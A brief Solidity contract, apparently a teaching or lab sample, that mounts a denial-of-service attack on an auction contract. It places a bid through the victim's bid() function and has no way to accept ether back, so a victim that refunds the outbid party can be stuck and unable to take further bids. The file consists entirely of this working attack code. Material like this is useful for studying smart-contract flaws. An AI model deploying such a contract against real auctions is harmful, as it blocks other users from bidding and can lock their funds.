pragma solidity ^0.6.10;

interface IDosVictim {
    function bid() external payable;
}

contract Dos {
    address public victim;

    constructor(address _victim) public {
        victim = _victim;
    }

    function attack() public payable {
        IDosVictim(victim).bid{value: msg.value}();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
